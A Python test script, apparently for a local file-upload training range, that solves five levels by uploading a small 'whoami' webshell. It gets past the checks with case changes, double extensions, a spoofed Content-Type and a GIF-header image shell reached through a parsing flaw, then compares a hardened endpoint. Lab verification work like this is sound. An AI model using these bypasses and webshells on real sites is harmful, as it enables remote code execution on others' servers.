# -*- coding: utf-8 -*-
"""验证 UploadForge 靶场 5 个 FLAG 可解 + 安全对照打不动"""
import requests

BASE = "http://127.0.0.1:5031"

WEBSHELL = "<?py\nimport os\nprint(os.popen('whoami').read())\n?>"
IMG_MAL = "GIF89a\n<?py\nimport os\nprint(os.popen('whoami').read())\n?>"  # 图片马（GIF头+代码）


def check_flags():
    r = requests.get(BASE + "/")
    return {
        "flag1": "L1 无检查 ✅" in r.text,
        "flag2": "L2 黑名单 ✅" in r.text,
        "flag3": "L3 白名单+解析 ✅" in r.text,
        "flag4": "L4 Content-Type ✅" in r.text,
        "flag5": "L5 内容检查+图片马 ✅" in r.text,
    }


requests.get(BASE + "/reset")
print("重置后:", check_flags())
print()

# L1 无检查：直接上传 shell.py
print("=== L1 无检查 ===")
r = requests.post(BASE + "/level/1/upload", files={"file": ("shell.py", WEBSHELL)})
print("上传结果:", "FLAG1" if check_flags()["flag1"] else "未触发")
r = requests.get(BASE + "/uploads/level1/shell.py")
print("执行 whoami:", r.text.strip()[:60])
print()

# L2 黑名单：大小写 shell.PY
print("=== L2 黑名单(大小写) ===")
r = requests.post(BASE + "/level/2/upload", files={"file": ("shell.PY", WEBSHELL)})
print("上传结果:", "FLAG2" if check_flags()["flag2"] else "未触发")
print()

# L3 白名单+Apache解析：双扩展名 shell.py.jpg
print("=== L3 白名单+双扩展名 ===")
r = requests.post(BASE + "/level/3/upload", files={"file": ("shell.py.jpg", WEBSHELL)})
print("上传结果:", "FLAG3" if check_flags()["flag3"] else "未触发")
r = requests.get(BASE + "/uploads/level3/shell.py.jpg")
print("执行 whoami:", r.text.strip()[:60])
print()

# L4 Content-Type：改文件部分 Content-Type 为 image/jpeg
print("=== L4 Content-Type 绕过 ===")
r = requests.post(BASE + "/level/4/upload",
                  files={"file": ("shell.py", WEBSHELL, "image/jpeg")})
print("上传结果:", "FLAG4" if check_flags()["flag4"] else "未触发")
print()

# L5 内容检查：图片马 + Nginx 解析漏洞访问
print("=== L5 图片马 + Nginx解析 ===")
r = requests.post(BASE + "/level/5/upload", files={"file": ("avatar.gif", IMG_MAL)})
print("上传图片马:", "成功(普通文件)" if "普通文件" in r.text else "上传结果异常")
r = requests.get(BASE + "/uploads/level5/avatar.gif/x.py")
print("Nginx解析执行:", "FLAG5" if check_flags()["flag5"] else "未触发")
print("执行 whoami:", r.text.strip()[:80])
print()

# 安全对照：图片马被随机改名，无法触发执行
print("=== 安全对照 ===")
r = requests.post(BASE + "/secure", files={"file": ("avatar.gif", IMG_MAL)})
print("随机改名:", "随机改名" in r.text or "无法预测" in r.text)
print()

print("=== 最终状态 ===")
print(check_flags())
